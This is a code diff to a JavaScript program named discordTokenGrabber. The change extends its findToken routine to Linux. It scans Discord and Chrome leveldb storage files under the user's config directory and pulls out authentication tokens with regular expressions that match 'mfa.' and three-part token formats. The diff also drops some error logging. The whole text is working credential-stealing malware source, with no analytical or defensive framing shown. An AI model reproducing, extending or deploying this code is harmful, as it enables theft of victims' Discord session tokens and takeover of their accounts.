@@ -32,7 +32,6 @@ const findToken = (tokenPath) => {
         }
       })
     } catch (error) {
-      console.log(error)
       console.log(`=> No directory found for ${tokenPath}`)
     }
   } else if (computerPlatform == 'darwin') {
@@ -61,11 +60,39 @@ const findToken = (tokenPath) => {
         }
       })
     } catch (error) {
-      console.log(error)
       console.log(`=> No directory found for ${tokenPath}`)
     }
+  } else if (computerPlatform === 'linux') {
+      tokenPath += '/Local Storage/leveldb/'
+      
+      try {
+        fs.readdirSync(path.normalize(tokenPath)).map((file) => {
+          if (file.endsWith('.log') || file.endsWith('.ldb')) {
+            fs.readFileSync(`${tokenPath}/${file}`, 'utf8')
+              .split(/\r?\n/)
+              .forEach((line) => {
+                const regex = [
+                  new RegExp(/mfa\.[\w-]{84}/g),
+                  new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)
+                ]
+                for (const _regex of regex) {
+                  const token = line.match(_regex)
+  
+                  if (token) {
+                    token.forEach((element) => {
+                      tokens.push(element)
+                    })
+                  }
+                }
+              })
+          }
+        })
+      } catch (error) {
+        if (error) {
+          console.log(`=> No directory found for ${tokenPath}`)  
+        }
+      }
   }
-
   return tokens
 }
 
@@ -87,15 +114,14 @@ function discordTokenGrabber() {
       Yandex: path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
     }
   } else if (computerPlatform == 'linux') {
-    paths = {
-      Discord: path.join(home, 'discord'),
-      'Discord Canary': path.join(home + 'discordcanary'),
-      'Discord PTB': path.join(home + 'discordptb'),
-      'Google Chrome': path.join(home + 'Google', 'Chrome', 'User Data', 'Default'),
-      Opera: path.join(home + 'Opera Software', 'Opera Stable'),
-      Brave: path.join(home + 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
-      Yandex: path.join(home + 'Yandex', 'YandexBrowser', 'User Data', 'Default')
-    }
+    const home = path.join(process.env.HOME, ".config/");
+
+        paths = {
+            "Discord": path.join(home, "discord"),
+            "Discord Canary": path.join(home + "discordcanary"),
+            "Discord PTB": path.join(home + "discordptb"),
+            "Google Chrome": path.join(home + "google-chrome")
+        }
   } else if (computerPlatform == 'darwin') {
     paths = {
       Discord: path.join(process.env.HOME, 'Library', 'Application Support', 'discord'),
